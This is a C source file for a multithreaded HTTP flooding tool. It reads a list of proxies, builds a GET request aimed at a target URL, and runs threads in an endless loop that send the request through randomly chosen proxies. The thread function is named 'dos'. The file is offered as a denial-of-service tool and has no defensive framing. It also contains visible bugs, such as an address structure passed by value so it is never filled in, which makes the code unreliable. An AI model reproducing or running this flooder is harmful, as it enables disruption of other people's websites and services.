#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

int sizeread;
char *tgtip;
char *req;

struct proxies {
 char ip[32];
 int port;
}proxylist[100000];

struct timeval tv;
char proxytemp[100000][32];

int makeproxies() {
 int size;
 char *tempport;
 for(int i = 0; i < sizeread; i++) {
  if(strstr(proxytemp[i], ":")) {
   tempport = strstr(proxytemp[i], ":") + 1;
   size = strlen(tempport); 
   proxylist[i].port = atoi(tempport);
   size = size + 1;
   memcpy(proxylist[i].ip, proxytemp[i], (strlen(proxytemp[i]) - size));
   dprintf(1, "%s:%d loaded\n", proxylist[i].ip, proxylist[i].port); 
  }
 }
}

int read_file(char *file) {
 FILE *fd; 
 int a = 0;
 if((fd = fopen(file, "rb"))) {
  while(fgets(proxytemp[a], 32, fd) != 0) {
   a++;
  } 
  sizeread = a;
  makeproxies();
 } else {
  dprintf(1,"proxy file does not exist\n");
  exit(0);
 }
}

int make_req() {
 req = malloc(1024); 
 sprintf(req, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nProxy-Connection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n", tgtip, tgtip);
 dprintf(1, "%s", req);
 dprintf(1, "is this correct y/n?\n");
 char a = getc(stdin); 
 if(a == 'y') {
  sleep(1);
 } else {
  exit(0);
 }
}

int makesa(int i, struct sockaddr_in sa) {
 sa.sin_addr.s_addr = inet_addr(proxylist[i].ip);
 sa.sin_port = htons(proxylist[i].port); 
 sa.sin_family = AF_INET;
}

void *dos(void *unused) {
 int i = rand() % ((sizeread - 1) - 0) + 0; 
 struct sockaddr_in sa; 
 makesa(i, sa);
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req, strlen(req), MSG_NOSIGNAL); 
  dprintf(1, "Sent through %s:%d\n", proxylist[i].ip, proxylist[i].port);
 }
 close(fd);
}

int make_threads(int threadnum) {
 pthread_t threads[threadnum]; 
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threads[i], 0, &dos, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threads[i], 0);
  }
 } 
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srand(time(0));
 if(argc < 4) {
  dprintf(1, "url(with http://) threads proxy-list\n");
  return 0;
 }
 read_file(argv[3]);
 tgtip = argv[1];
 make_req();
 make_threads(atoi(argv[2]));
}
